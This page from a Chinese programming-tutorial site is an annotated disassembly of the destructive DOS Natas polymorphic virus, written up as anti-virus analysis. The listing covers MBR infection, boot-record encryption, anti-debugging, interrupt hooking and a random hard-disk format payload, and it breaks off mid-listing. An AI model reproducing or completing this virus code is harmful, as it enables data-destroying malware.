@@ -1,0 +1,2585 @@
+<!-- header-start -->
+<!DOCTYPE html>
+<html>
+<head>
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
+<script src="/include/js/jquery.min.js" language="javascript"></script>
+<script src="/include/js/jquery-ui.min.js" language="javascript"></script>
+<link href="/include/css/jquery-ui.min.css" rel="stylesheet" type="text/css" />
+<link href="/include/css/main.css" rel="stylesheet" type="text/css" />
+
+<SCRIPT>
+	$(document).ready(function() {
+		$( "#menu" ).menu({ position: { my: "left top", at: "right-100 top+35" } });
+	});
+</SCRIPT>
+
+<!-- header-end -->
+<!-- middle-start -->
+﻿
+<base target="_blank" />
+</head>
+<body>
+
+<script>
+(function(){
+    var bp = document.createElement('script');
+    var curProtocol = window.location.protocol.split(':')[0];
+    if (curProtocol === 'https'){
+   bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+  }
+  else{
+  bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+  }
+    var s = document.getElementsByTagName("script")[0];
+    s.parentNode.insertBefore(bp, s);
+})();
+</script>
+<!-- topmenu-start -->
+<header>
+    <section id="global-nav">
+        <nav>
+            <ul class="projects">
+                    <li><a href="/">ITeedu.com</a></li>
+            </ul>
+            <ul class="links">
+                    <li><a>快捷导航</a>
+                        <ul>
+                            <li><a href="/plang/">编程语言</a></li>
+                            <li><a href="/webtech/">WEB开发</a></li>
+                            <li><a href="/handset/">手机开发</a></li>
+                            <li><a href="/database/">数据库</a></li>
+                            <li><a href="/os/">操作系统</a></li>
+                            <li><a href="/embed/">嵌入式</a></li>
+                            <li><a href="/opensource/">开源软件</a></li>
+                            <li><a href="/works/">作品</a></li>
+
+                        </ul>
+                    </li>
+                    <li><a href="/plang/asm/">编辑语言</a>
+                        <ul>
+                                <li><a href="/plang/asm/">汇编</a></li>
+                                <li><a href="/plang/ccpp/">C/C++</a> </li>
+                                <li><a href="/plang/java/">JAVA</a> </li>
+                                <li><a href="/plang/python/">Python</a> </li>
+                                <li><a href="/plang/ruby/">Ruby</a></li>
+                        </ul>
+                    </li>
+                    <li><a href="/webtech/">WEB开发</a>
+                        <ul>
+                            <li><a href="/webtech/javascript/">javascript</a> </li>
+                            <li><a href="/webtech/j2ee/">J2EE</a> </li>
+                            <li><a href="/webtech/php/">PHP</a> </li>
+                            <li><a href="/webtech/python/djangocn2/">Django</a> </li>
+                        </ul>
+                    </li>
+					<li><a href="/me/contactme.htm">关于</a></li>
+            </ul>
+        </nav>
+    </section>
+</header>
+<!-- topmenu-end -->
+
+<div id="container" style="margin: 35px 120px 0px 120px;">
+	<div id="logo-wapper">
+		<div style="float:left;width:150px;" ><h1 class="logo">ITEEDU</h1></div>
+		<div style="float:right;width:760px">
+
+		</div>
+		<div style="clear:both;"></div>
+	</div>
+<nav id="main-nav">
+<!-- menunav-start -->
+<div id="menu">
+    <li><a href="/plang/">编程语言</a>
+        <ul>
+            <LI><a href="/plang/asm/">汇编</a></LI>
+            <LI><a href="/plang/ccpp/">C/C++</a> </LI>
+            <LI><a href="/plang/java/">JAVA</a> </LI>
+            <LI><a href="/plang/python/">Python</a> </LI>
+            <LI><a href="/plang/ruby/">Ruby</a></LI>
+        </ul>
+    </li>
+    <li><a href="/webtech/index.php">WEB开发</a>
+        <ul>
+            <LI><a href="/webtech/j2ee/">J2EE</a></LI>
+            <LI><a href="/webtech/php/">PHP</a> </LI>
+            <LI><a href="/webtech/python/djangocn2/">djangocn2</a> </LI>
+        </ul>
+    </li>
+    <li><a href="/handset/index.php">手机开发</a>
+        <ul>
+            <LI><a href="/handset/android/">android</a></LI>
+            <LI><a href="/handset/iphone/">iphone</a> </LI>
+        </ul>
+    </li>
+    <li><a href="/database/index.php">数据库</a>
+        <ul>
+            <LI><a href="/database/mysql/">MYSQL</a></LI>
+            <LI><a href="/database/sqlite/">sqlite</a></LI>
+    	</ul>
+    </li>
+    <li><a href="/os/">操作系统</a>
+        <ul>
+        	<LI><a href="/os/linux/">Linux</a></LI>
+        	<LI><a href="/os/grub/">GRUB</a></LI>
+    	</ul>
+     </li>
+     <li><a href="/embed/">嵌入式</a></li>
+     <li><a href="/opensource/">开源软件</a></li>
+</div>
+<!-- menunav-end -->
+</nav>
+<div id="content-wrapper">
+<div id="file-wrapper">
+
+
+<!-- middle-end -->
+
+
+
+<div class="lpindex"><a href="index.html">首页</a><a href="113.html"> 上一页</a></div>
+<h1>Natas 幽灵王病毒的分析</h1>
+<h2>病毒介绍:</h2>
+<p>  Natas 病毒，长度 4744 字节，有的地方有把它称为 4744 病毒，由于病毒是用了变型技术，本身的形态几乎有无穷多种，使杀毒软件总漏掉一两个，不知什么时候又冒了出来，所以又称它为‘幽灵王’。<br>
+    但变型加密技术并不可怕，我认为，查病毒并没有通用的方法，病毒用了多少的代码用于加密，杀毒程序也少不了这么多代码，编病毒的人用了多少时间调试，杀病毒的人只会用更多的时间去分析，从来没有通用的杀毒办法，只要以这种态度去分析病毒，杀毒程序就能把病毒杀完全。君不见，有些杀毒软件刚推出是号称开放式杀毒，永远不用升级，用户自己只要加加病毒库就行了，但到后来，升级升得比谁都快，出一个新病毒一升级，版本号都快把26个字母用完了。<br>
+    由于 Natas 病毒的长度长达 4744 字节，变型加密部分就用的近 2k，我一时没有时间写具体的杀毒细节，只能尽可能多注释一下。<br>
+  　Natas 病毒是一种恶性病毒，它再启动时有1/512的机会要格式化硬盘。如果发现它，要注意马上杀，不然下一次启动你的硬盘资料可能就完蛋了。具体分析见注释。如果谁有杀毒原程序愿意公布，可以发一份给我。</p>
+<h3>病毒分析:</h3>
+<pre class="code">9E80:0000 0E             PUSH	CS
+9E80:0001 1F             POP	DS 
+9E80:0002 E89400         CALL	0099 		;保存 INT 13/15/21/40
+9E80:0005 A27304         MOV	[0473],AL 	;AL = 0
+9E80:0008 A21114         MOV	[1411],AL 
+9E80:000B 8EC0           MOV	ES,AX 
+9E80:000D 5F             POP	DI 
+9E80:000E 83EF03         SUB	DI,+03 
+9E80:0011 50             PUSH	AX 
+9E80:0012 57             PUSH	DI 		;设置执行原引导记录地址
+9E80:0013 BE4700         MOV	SI,0047 	;解密并恢复原引导区
+9E80:0016 E81D00         CALL	0036 
+9E80:0019 B013           MOV	AL,13 
+9E80:001B BA7204         MOV	DX,0472 	;设置新 INT 13 => CS:0472
+9E80:001E E8B300         CALL	00D4 
+9E80:0021 E8EF00         CALL	0113 		;传染硬盘引导区
+9E80:0024 84168E00       TEST	[008E],DL 
+9E80:0028 740B           JZ	0035 
+9E80:002A B8FF01         MOV	AX,01FF 
+9E80:002D E83611         CALL	1166 		;产生随机数 < 512
+9E80:0030 7503           JNZ	0035 		;如果为 0 转格式化硬盘
+9E80:0032 E91304         JMP	0448 		;即每次启动有 1/512 的机会
+9E80:0035 CB             RETF	 		;格式化硬盘
+;===========================================================================
+;加密/解密原引导记录
+9E80:0036 8A64FF         MOV	AH,[SI-01] 
+9E80:0039 B92900         MOV	CX,0029 
+9E80:003C FC             CLD	 
+9E80:003D AC             LODSB	 
+9E80:003E 32C4           XOR	AL,AH 
+9E80:0040 D0C4           ROL	AH,1 
+9E80:0042 AA             STOSB	 
+9E80:0043 E2F8           LOOP	003D 
+9E80:0045 C3             RET	 
+9E80:0046                    07 FD-3D DC B6 A0 5C C1 FF 11        .}=\6 \A..
+9E80:0050  09 A7 40 70 D6 04 B4 19-58 0A 6B CF DE BD 3A 0C  .'@pV.4.X.kO^=:.
+9E80:0060  0E E0 CB D4 E6 DE 45 42-F0 13 B3 7E F8 BD 0B 4A  .`KTf^EBp.3~x=.J
+;==========================================================================
+;	新引导区入口程序
+;==========================================================================
+9E80:0070 E80000         CALL	0073 		;重定位
+9E80:0073 BF4000         MOV	DI,0040 
+9E80:0076 8EDF           MOV	DS,DI 		;0040:0013
+9E80:0078 836DD306       SUB	Word Ptr [DI-2D],+06 	;内存减 6K
+9E80:007C 8B45D3         MOV	AX,[DI-2D] 
+9E80:007F B10A           MOV	CL,0A 
+9E80:0081 D3C8           ROR	AX,CL 
+9E80:0083 8EC0           MOV	ES,AX 		;高端段地址
+9E80:0085 B80902         MOV	AX,0209 	;读出病毒 9 扇区
+9E80:0088 33DB           XOR	BX,BX 
+9E80:008A B9014F         MOV	CX,4F01   ===>	;CX, DX 值由 0166 设置
+9E80:008D BA0001         MOV	DX,0100 
+9E80:0090 CD13           INT	13 
+9E80:0092 7203           JB	0097 
+9E80:0094 06             PUSH	ES 		;转 0000 执行
+9E80:0095 53             PUSH	BX 
+9E80:0096 CB             RETF	 
+9E80:0097 CD18           INT	18 
+;===========================================================================
+;保存中断开始 5 字节
+;INT 13 ===> 13EB
+;INT 15 ===> 13F3
+;INT 40 ===> 13F7
+;INT 21 ===> 13FB
+9E80:0099 1E             PUSH	DS 
+9E80:009A 33C0           XOR	AX,AX 
+9E80:009C 8ED8           MOV	DS,AX 
+9E80:009E BE4C00         MOV	SI,004C 	;中断 13
+9E80:00A1 BFEB13         MOV	DI,13EB 
+9E80:00A4 56             PUSH	SI 
+9E80:00A5 56             PUSH	SI 
+9E80:00A6 A5             MOVSW	 
+9E80:00A7 A5             MOVSW	 
+9E80:00A8 5E             POP	SI 
+9E80:00A9 A5             MOVSW	 
+9E80:00AA A5             MOVSW	 
+9E80:00AB BE5400         MOV	SI,0054 	;中断 15
+9E80:00AE A5             MOVSW	 
+9E80:00AF A5             MOVSW	 
+9E80:00B0 5E             POP	SI 
+9E80:00B1 38067504       CMP	[0475],AL 
+9E80:00B5 7403           JZ	00BA 
+9E80:00B7 BE0001         MOV	SI,0100 
+9E80:00BA A5             MOVSW	 
+9E80:00BB A5             MOVSW	 
+9E80:00BC BE8400         MOV	SI,0084 	;中断 21
+9E80:00BF A5             MOVSW	 
+9E80:00C0 A5             MOVSW	 
+9E80:00C1 1F             POP	DS 
+9E80:00C2 C3             RET	 
+;=========================================================================
+;取中断向量于 ES:BX, 入口 AL = 中断向量号
+9E80:00C3 50             PUSH	AX 
+9E80:00C4 32E4           XOR	AH,AH 
+9E80:00C6 D1C0           ROL	AX,1 
+9E80:00C8 D1C0           ROL	AX,1 
+9E80:00CA 93             XCHG	AX,BX 
+9E80:00CB 33C0           XOR	AX,AX 
+9E80:00CD 8EC0           MOV	ES,AX 
+9E80:00CF 26C41F         LES	BX,ES:[BX] 
+9E80:00D2 58             POP	AX 
+9E80:00D3 C3             RET	 
+;=========================================================================
+;设置中断向量到 DS:DX, 入口 AL = 中断向量号
+9E80:00D4 50             PUSH	AX 
+9E80:00D5 53             PUSH	BX 
+9E80:00D6 1E             PUSH	DS 
+9E80:00D7 32E4           XOR	AH,AH 
+9E80:00D9 D1C0           ROL	AX,1 
+9E80:00DB D1C0           ROL	AX,1 
+9E80:00DD 93             XCHG	AX,BX 
+9E80:00DE 33C0           XOR	AX,AX 
+9E80:00E0 1E             PUSH	DS 
+9E80:00E1 8ED8           MOV	DS,AX 
+9E80:00E3 8917           MOV	[BX],DX 
+9E80:00E5 8F4702         POP	[BX+02] 
+9E80:00E8 1F             POP	DS 
+9E80:00E9 5B             POP	BX 
+9E80:00EA 58             POP	AX 
+9E80:00EB C3             RET	 
+;========================================================================
+;所有寄存器进堆栈
+9E80:00EC 2E8F060214     POP	CS:[1402] 
+9E80:00F1 9C             PUSHF	 
+9E80:00F2 50             PUSH	AX 
+9E80:00F3 53             PUSH	BX 
+9E80:00F4 51             PUSH	CX 
+9E80:00F5 52             PUSH	DX 
+9E80:00F6 55             PUSH	BP 
+9E80:00F7 56             PUSH	SI 
+9E80:00F8 57             PUSH	DI 
+9E80:00F9 1E             PUSH	DS 
+9E80:00FA 06             PUSH	ES 
+9E80:00FB 8BEC           MOV	BP,SP 
+9E80:00FD 2EFF260214     JMP	CS:[1402] 
+;=========================================================================
+;所有寄存器出堆栈
+9E80:0102 2E8F060214     POP	CS:[1402] 
+9E80:0107 07             POP	ES 
+9E80:0108 1F             POP	DS 
+9E80:0109 5F             POP	DI 
+9E80:010A 5E             POP	SI 
+9E80:010B 5D             POP	BP 
+9E80:010C 5A             POP	DX 
+9E80:010D 59             POP	CX 
+9E80:010E 5B             POP	BX 
+9E80:010F 58             POP	AX 
+9E80:0110 9D             POPF	 
+9E80:0111 EBEA           JMP	00FD 
+;==========================================================================
+;文件执行初始化及启动时传染硬盘子程序
+;由 0021 043C 调用
+9E80:0113 0E             PUSH	CS 
+9E80:0114 0E             PUSH	CS 
+9E80:0115 07             POP	ES 
+9E80:0116 1F             POP	DS 
+9E80:0117 B80102         MOV	AX,0201 
+9E80:011A BB1314         MOV	BX,1413 
+9E80:011D B90100         MOV	CX,0001 
+9E80:0120 BA8000         MOV	DX,0080 
+9E80:0123 E89509         CALL	0ABB 		;读硬盘主引导区
+9E80:0126 7230           JB	0158 
+9E80:0128 38AFBF01       CMP	[BX+01BF],CH 	;无保留磁道不传染
+9E80:012C 742A           JZ	0158 
+9E80:012E 8B8FC401       MOV	CX,[BX+01C4] 	;取保留磁道扇区数
+9E80:0132 83E13F         AND	CX,+3F 		;屏蔽 CX 高位 (柱面高位)
+9E80:0135 83E909         SUB	CX,+09 		;到数 9 扇区
+9E80:0138 761E           JBE	0158 		;扇区数小于 9 不传染
+9E80:013A 80F901         CMP	CL,01 
+9E80:013D 7619           JBE	0158 
+9E80:013F E81700         CALL	0159 		;判断是否已传染
+9E80:0142 7214           JB	0158 		;已传染退出
+9E80:0144 53             PUSH	BX 
+9E80:0145 B80903         MOV	AX,0309 	;写病毒到保留扇区
+9E80:0148 33DB           XOR	BX,BX 
+9E80:014A E86E09         CALL	0ABB 
+9E80:014D 5B             POP	BX
+9E80:014E 7208           JB	0158 
+9E80:0150 B80103         MOV	AX,0301 	;写新引导记录
+9E80:0153 B101           MOV	CL,01 		;CS:0000
+9E80:0155 E86309         CALL	0ABB 
+9E80:0158 C3             RET	 
+;==========================================================================
+;判断引导记录是否已传染及准备新的引导记录
+9E80:0159 51             PUSH	CX 
+9E80:015A 52             PUSH	DX 
+9E80:015B 81BFFE0155AA   CMP	Word Ptr [BX+01FE],AA55 
+9E80:0161 7525           JNZ	0188 
+9E80:0163 BF4700         MOV	DI,0047 
+9E80:0166 894D44         MOV	[DI+44],CX 	;保存病毒传染位置
+9E80:0169 80E280         AND	DL,80 
+9E80:016C 895547         MOV	[DI+47],DX 
+9E80:016F E81A00         CALL	018C 		;判断是否传染 (返回 SI 地址)
+9E80:0172 7414           JZ	0188 		;已传染转 0188 退出
+9E80:0174 E8EC0F         CALL	1163 		;产生随机数
+9E80:0177 8865FF         MOV	[DI-01],AH 	;保存于 0046
+9E80:017A 56             PUSH	SI 
+9E80:017B E8BBFE         CALL	0039 		;加密原引导记录
+9E80:017E 8BF7           MOV	SI,DI 		;SI = 0070, 病毒入口
+9E80:0180 5F             POP	DI 		;DI = 原引导记录 JMP 入口
+9E80:0181 B92900         MOV	CX,0029 	;移动病毒到原引导记录
+9E80:0184 F3             REPZ	
+9E80:0185 A4             MOVSB	 
+9E80:0186 F8             CLC	 
+9E80:0187 B0F9           MOV	AL,F9 
+9E80:0189 5A             POP	DX 
+9E80:018A 59             POP	CX 
+9E80:018B C3             RET	 
+;==========================================================================
+;返回 JMP 后的指令地址于 SI
+;判断 JMP 后指令是否为 0070 处指令 (是否传染)
+9E80:018C 8BF3           MOV	SI,BX 
+9E80:018E FC             CLD	 
+9E80:018F AC             LODSB	 
+9E80:0190 50             PUSH	AX 
+9E80:0191 AD             LODSW	 
+9E80:0192 91             XCHG	AX,CX 		;AL/CX 为引导区前 3 字节
+9E80:0193 58             POP	AX 
+9E80:0194 3CEB           CMP	AL,EB 		;JMP XXXX
+9E80:0196 7505           JNZ	019D 
+9E80:0198 32ED           XOR	CH,CH 
+9E80:019A 4E             DEC	SI 
+9E80:019B EB08           JMP	01A5 
+9E80:019D 3CE9           CMP	AL,E9 		;JMP XXXX
+9E80:019F 7404           JZ	01A5 
+9E80:01A1 33C9           XOR	CX,CX 
+9E80:01A3 8BF3           MOV	SI,BX 
+9E80:01A5 03F1           ADD	SI,CX 		;SI 为引导记录开始指令
+9E80:01A7 81FEE515       CMP	SI,15E5 	;15E5 - 1413 = 01D2
+9E80:01AB 73F4           JNB	01A1 		; > 01D2 退出
+9E80:01AD 813CE800       CMP	Word Ptr [SI],00E8 
+9E80:01B1 7505           JNZ	01B8 		;判前 2 句指令是否
+9E80:01B3 817C0200BF     CMP	Word Ptr [SI+02],BF00 	;CALL next/MOV DI,xxxx
+9E80:01B8 C3             RET	 		;(见 0070)
+;=========================================================================
+;判断是否有跟踪
+;如果有,返回 BP <> 0
+9E80:01B9 33C0           XOR	AX,AX 
+9E80:01BB 9C             PUSHF	 
+9E80:01BC 5A             POP	DX 		;取当前标志
+9E80:01BD 80E6FE         AND	DH,FE 
+9E80:01C0 52             PUSH	DX 
+9E80:01C1 52             PUSH	DX 
+9E80:01C2 9D             POPF	 
+9E80:01C3 16             PUSH	SS 
+9E80:01C4 17             POP	SS 
+9E80:01C5 9C             PUSHF	 
+9E80:01C6 5A             POP	DX 
+9E80:01C7 F6C601         TEST	DH,01 
+9E80:01CA 5A             POP	DX 
+9E80:01CB 7415           JZ	01E2 		;无跟踪转 01E2
+9E80:01CD 06             PUSH	ES 
+9E80:01CE 33ED           XOR	BP,BP 
+9E80:01D0 8CD1           MOV	CX,SS 
+9E80:01D2 FA             CLI	 
+9E80:01D3 8ED5           MOV	SS,BP 
+9E80:01D5 C47E04         LES	DI,[BP+04] 	;有跟踪取 INT 01 地址
+9E80:01D8 8ED1           MOV	SS,CX 
+9E80:01DA FB             STI	 
+9E80:01DB B0CF           MOV	AL,CF 
+9E80:01DD FC             CLD	 
+9E80:01DE AA             STOSB	 		;将 INT 01 设置为 IRET
+9E80:01DF 07             POP	ES 
+9E80:01E0 52             PUSH	DX 
+9E80:01E1 9D             POPF	 
+9E80:01E2 95             XCHG	AX,BP 		;无跟踪 AX = 0
+9E80:01E3 C3             RET	 
+;========================================================================
+;保存或恢复 INT 13 中断前 5 字节
+9E80:01E4 E805FF         CALL	00EC 
+9E80:01E7 BED913         MOV	SI,13D9
+9E80:01EA 2EC47C16       LES	DI,CS:[SI+16] 
+9E80:01EE EB0A           JMP	01FA
+;========================================================================
+;保存或恢复 INT 21 中断前 5 字节 
+9E80:01F0 E8F9FE         CALL	00EC 
+9E80:01F3 BEDE13         MOV	SI,13DE 
+9E80:01F6 2EC47C1D       LES	DI,CS:[SI+1D] 
+9E80:01FA 0E             PUSH	CS 
+9E80:01FB 1F             POP	DS 
+9E80:01FC B90500         MOV	CX,0005 
+9E80:01FF 382E1114       CMP	[1411],CH 	;[1411] 引导区引入时为 0
+9E80:0203 740B           JZ	0210 
+9E80:0205 FC             CLD	 
+9E80:0206 AC             LODSB	 
+9E80:0207 268605         XCHG	AL,ES:[DI] 
+9E80:020A 8844FF         MOV	[SI-01],AL 
+9E80:020D 47             INC	DI 
+9E80:020E E2F6           LOOP	0206 
+9E80:0210 E8EFFE         CALL	0102 
+9E80:0213 C3             RET	 
+;=========================================================================
+;由初始化程序调用
+9E80:0214 E882FE         CALL	0099 		;保存 INT 13/15/21/40
+9E80:0217 B452           MOV	AH,52		;中断前 5 字节
+9E80:0219 CD21           INT	21 
+9E80:021B 268B47FE       MOV	AX,ES:[BX-02] 	;AX = 第一块 MCB 地址
+9E80:021F A3AD02         MOV	[02AD],AX 
+9E80:0222 B001           MOV	AL,01 		;取 INT 01 中断地址
+9E80:0224 E89CFE         CALL	00C3 
+9E80:0227 53             PUSH	BX 
+9E80:0228 06             PUSH	ES 
+9E80:0229 BA7702         MOV	DX,0277 	;设置 INT 01 中断地址
+9E80:022C E8A5FE         CALL	00D4 		;到 CS:0277
+9E80:022F 9C             PUSHF	 
+9E80:0230 5E             POP	SI 
+9E80:0231 BF9702         MOV	DI,0297 
+9E80:0234 C60503         MOV	Byte Ptr [DI],03 
+9E80:0237 B401           MOV	AH,01 
+9E80:0239 E83400         CALL	0270 		;激活 INT 01
+9E80:023C E87C08         CALL	0ABB 		;执行 INT 13,找 BIOS INT 13地址
+;本句功能为先执行 029B, 再执行 02C8,在 02C8 中找出
+;BIOS 的 INT 13 地址, 即段地址高位在 C8 到 F4 之间
+;找到以后转 02B4, 将 INT 13 地址保存在 13EB 中
+9E80:023F C60526         MOV	Byte Ptr [DI],26
+9E80:0242 B4C0           MOV	AH,C0 
+9E80:0244 E82900         CALL	0270 		;激活 INT 01
+9E80:0247 9C             PUSHF	 		;调用 INT 15,找 BIOS INT 15地址
+9E80:0248 FF1EF313       CALL	FAR [13F3] 
+;本段功能为先执行 02BE, 同上找出 BIOS INT 15 地址
+;保存于 13F3 中
+9E80:024C C60513         MOV	Byte Ptr [DI],13 
+9E80:024F B430           MOV	AH,30
+9E80:0251 E81C00         CALL	0270 		;激活 INT 01
+9E80:0254 E86E08         CALL	0AC5 		;调用 INT 21
+;本段功能为找出 MSDOS 中 INT 21 的地址, 先执行
+;02AB, 判断执行段地址小于第一块 MCB 地址, 即为
+;INT 21 的地址, 找到后保存于 13FB 中
+9E80:0257 C6052B         MOV	Byte Ptr [DI],2B
+9E80:025A B401           MOV	AH,01 
+9E80:025C E81100         CALL	0270 
+9E80:025F E86908         CALL	0ACB 
+;本段功能为找出 BIOS INT 40 地址,具体为先执行 02C3
+;再同 INT 13 之执行, 找到 INT 40 地址保存于 13F7 中
+9E80:0262 81E6FFFE       AND	SI,FEFF 
+9E80:0266 56             PUSH	SI 
+9E80:0267 9D             POPF			;停止 INT 01
+9E80:0268 1F             POP	DS 		;恢复原 INT 01 地址
+9E80:0269 5A             POP	DX 
+9E80:026A B001           MOV	AL,01 
+9E80:026C E865FE         CALL	00D4 
+9E80:026F C3             RET	 
+9E80:0270 81CE0001       OR	SI,0100 
+9E80:0274 56             PUSH	SI 
+9E80:0275 9D             POPF	 
+9E80:0276 C3             RET	 
+;=========================================================================
+;	病毒新 INT 01
+;	这是一个多个地方调用的子程序, 先由调用者设置 0296 出 JNZ 指令
+;	跳转的地址, 再设置并激活 INT 01
+;	在 0099 中用来找出初始 INT 13/15/21/40 地址
+;	在 INT 21 结束时用来重新截取 INT 21
+9E80:0277 1E             PUSH	DS 
+9E80:0278 0E             PUSH	CS 
+9E80:0279 1F             POP	DS 
+9E80:027A 893E6F03       MOV	[036F],DI 	;DI = 13E3
+9E80:027E BF6303         MOV	DI,0363 
+9E80:0281 8905           MOV	[DI],AX 	;保存返回时的
+9E80:0283 895D03         MOV	[DI+03],BX 	;AX 到 DX 值
+9E80:0286 894D06         MOV	[DI+06],CX 
+9E80:0289 895509         MOV	[DI+09],DX 
+9E80:028C 8F45FB         POP	[DI-05] 	;保存返回时的 DS
+9E80:028F 5B             POP	BX 		;调用 IP (INT 01)
+9E80:0290 59             POP	CX 		;调用 CS
+9E80:0291 5A             POP	DX 		;调用 FLAG
+9E80:0292 8CC8           MOV	AX,CS 
+9E80:0294 3BC1           CMP	AX,CX 		;是否调用者在病毒内
+9E80:0296 752B           JNZ	02C3 		;不在病毒内开始执行 INT 01 功能
+9E80:0298 E9BF00         JMP	035A
+;以下由 022F 处执行, 找 MSDOS INT 13 地址
+9E80:029B 3B0EAD02       CMP	CX,[02AD] 	;02AD 为第一个 MCB 地址
+9E80:029F 734D           JNB	02EE 		;不在 MSDOS 内返回
+9E80:02A1 BFEF13         MOV	DI,13EF 
+9E80:02A4 C606970230     MOV	Byte Ptr [0297],30	;下一次 0296
+9E80:02A9 EB0C           JMP	02B7 		;处为 JNZ 02C8
+;以下由 0257 处执行, 找 INT 21 地址
+9E80:02AB 81F9A30B       CMP	CX,0BA3  ===>	;本句地址由 021F 设置
+9E80:02AF 733D           JNB	02EE 		;为第一块 MCB 地址
+9E80:02B1 BFFB13         MOV	DI,13FB 
+9E80:02B4 80E6FE         AND	DH,FE 		;保存找到的地址
+9E80:02B7 891D           MOV	[DI],BX 	;并停止 INT 01
+9E80:02B9 894D02         MOV	[DI+02],CX 
+9E80:02BC EB30           JMP	02EE 
+;以下由 024C 处执行, 找 INT 15 地址
+9E80:02BE BFF313         MOV	DI,13F3 
+9E80:02C1 EB08           JMP	02CB 
+;以下由 0262 处执行, 找 INT 40 地址
+9E80:02C3 BFF713         MOV	DI,13F7 
+9E80:02C6 EB03           JMP	02CB 
+9E80:02C8 BFEB13         MOV	DI,13EB 	;从 02A9 转来
+9E80:02CB 80FDC8         CMP	CH,C8 		;段地址 < C800 退出
+9E80:02CE 721E           JB	02EE 
+9E80:02D0 80FDF4         CMP	CH,F4 		;段地址 > F400 退出
+9E80:02D3 72DF           JB	02B4 		;段地址指向 BIOS 转 02B4
+9E80:02D5 EB17           JMP	02EE 		;保存及停止 INT 01
+;INT 01 在 INT 21 结束时执行转此处
+9E80:02D7 FE0E1214       DEC	Byte Ptr [1412] 
+9E80:02DB 7511           JNZ	02EE 
+9E80:02DD 52             PUSH	DX 		;到 INT 21 第一句
+9E80:02DE B001           MOV	AL,01 		;恢复 INT 01 中断
+9E80:02E0 C516E313       LDS	DX,[13E3] 
+9E80:02E4 E8EDFD         CALL	00D4 		;
+9E80:02E7 E806FF         CALL	01F0 		;截取 INT 21 中断
+9E80:02EA 5A             POP	DX 
+9E80:02EB 80E6FE         AND	DH,FE 
+9E80:02EE F6C601         TEST	DH,01 		;标志复位转 035A 退出
+9E80:02F1 7467           JZ	035A 
+9E80:02F3 8ED9           MOV	DS,CX 
+9E80:02F5 33FF           XOR	DI,DI 
+9E80:02F7 8B01           MOV	AX,[BX+DI] 
+9E80:02F9 3CF0           CMP	AL,F0 
+9E80:02FB 7412           JZ	030F 
+9E80:02FD 3CF2           CMP	AL,F2 
+9E80:02FF 740E           JZ	030F 
+9E80:0301 3CF3           CMP	AL,F3 
+9E80:0303 740A           JZ	030F 
+9E80:0305 3C9C           CMP	AL,9C 
+9E80:0307 7309           JNB	0312 
+9E80:0309 24E7           AND	AL,E7 
+9E80:030B 3C26           CMP	AL,26
+9E80:030D 754B           JNZ	035A 
+9E80:030F 47             INC	DI 
+9E80:0310 EBE5           JMP	02F7 
+9E80:0312 750C           JNZ	0320 
+9E80:0314 80E6FE         AND	DH,FE 
+9E80:0317 52             PUSH	DX 
+9E80:0318 8D5901         LEA	BX,[BX+DI+01] 
+9E80:031B 80CE01         OR	DH,01 
+9E80:031E EBD3           JMP	02F3 
+9E80:0320 3C9D           CMP	AL,9D 
+9E80:0322 7503           JNZ	0327 
+9E80:0324 5A             POP	DX 
+9E80:0325 EBF1           JMP	0318 
+9E80:0327 3CCF           CMP	AL,CF 
+9E80:0329 7505           JNZ	0330 
+9E80:032B 5B             POP	BX 
+9E80:032C 59             POP	CX 
+9E80:032D 5A             POP	DX 
+9E80:032E EBEB           JMP	031B 
+9E80:0330 3CCD           CMP	AL,CD 
+9E80:0332 7412           JZ	0346 
+9E80:0334 3CCC           CMP	AL,CC 
+9E80:0336 B403           MOV	AH,03 
+9E80:0338 740B           JZ	0345 
+9E80:033A 3CCE           CMP	AL,CE 
+9E80:033C B404           MOV	AH,04 
+9E80:033E 751A           JNZ	035A 
+9E80:0340 F6C608         TEST	DH,08 
+9E80:0343 7415           JZ	035A 
+9E80:0345 4B             DEC	BX 
+9E80:0346 80E6FE         AND	DH,FE 
+9E80:0349 8D5902         LEA	BX,[BX+DI+02] 
+9E80:034C 52             PUSH	DX 
+9E80:034D 51             PUSH	CX 
+9E80:034E 53             PUSH	BX 
+9E80:034F 8AC4           MOV	AL,AH 
+9E80:0351 06             PUSH	ES 
+9E80:0352 E86EFD         CALL	00C3 
+9E80:0355 8CC1           MOV	CX,ES 
+9E80:0357 07             POP	ES 
+9E80:0358 EBC1           JMP	031B 
+9E80:035A 52             PUSH	DX 
+9E80:035B 51             PUSH	CX 
+9E80:035C 53             PUSH	BX 
+9E80:035D B85E9E         MOV	AX,9E5E 
+9E80:0360 8ED8           MOV	DS,AX 
+9E80:0362 B80601         MOV	AX,0106 
+9E80:0365 BB00FF         MOV	BX,FF00 
+9E80:0368 B90000         MOV	CX,0000 
+9E80:036B BA7702         MOV	DX,0277 
+9E80:036E BF9702         MOV	DI,0297 
+9E80:0371 CF             IRET	 
+;=========================================================================
+;	可执行文件入口
+;=========================================================================
+9E80:0372 1E             PUSH	DS 
+9E80:0373 E80000         CALL	0376 		;重定位
+9E80:0376 5E             POP	SI 
+9E80:0377 81EE7603       SUB	SI,0376 
+9E80:037B E83BFE         CALL	01B9 		;检测是否有跟踪
+9E80:037E 0BED           OR	BP,BP 		;有跟踪转 038D
+9E80:0380 750B           JNZ	038D 
+9E80:0382 B430           MOV	AH,30
+9E80:0384 BB9AF9         MOV	BX,F99A 
+9E80:0387 CD21           INT	21 
+9E80:0389 3C03           CMP	AL,03 		;内存驻留检测
+9E80:038B 7230           JB	03BD 		;已驻留转 03BD
+9E80:038D 8CC0           MOV	AX,ES 
+9E80:038F 48             DEC	AX 
+9E80:0390 8ED8           MOV	DS,AX 
+9E80:0392 33FF           XOR	DI,DI 
+9E80:0394 0BED           OR	BP,BP 		;有跟踪转 039D
+9E80:0396 7505           JNZ	039D 
+9E80:0398 803D5A         CMP	Byte Ptr [DI],5A	;非最后一块 MCB
+9E80:039B 7520           JNZ	03BD 		;转执行原程序
+9E80:039D B86201         MOV	AX,0162 
+9E80:03A0 294503         SUB	[DI+03],AX 	;内存减 1620 (5664)字节
+9E80:03A3 294512         SUB	[DI+12],AX 
+9E80:03A6 8E4512         MOV	ES,[DI+12] 
+9E80:03A9 8EDF           MOV	DS,DI 		;BIOS 内存减 6K
+9E80:03AB 832E130406     SUB	Word Ptr [0413],+06 
+9E80:03B0 B9D913         MOV	CX,13D9 	;将病毒 13D9 字节移动到高端
+9E80:03B3 FC             CLD	 
+9E80:03B4 F3             REPZ	
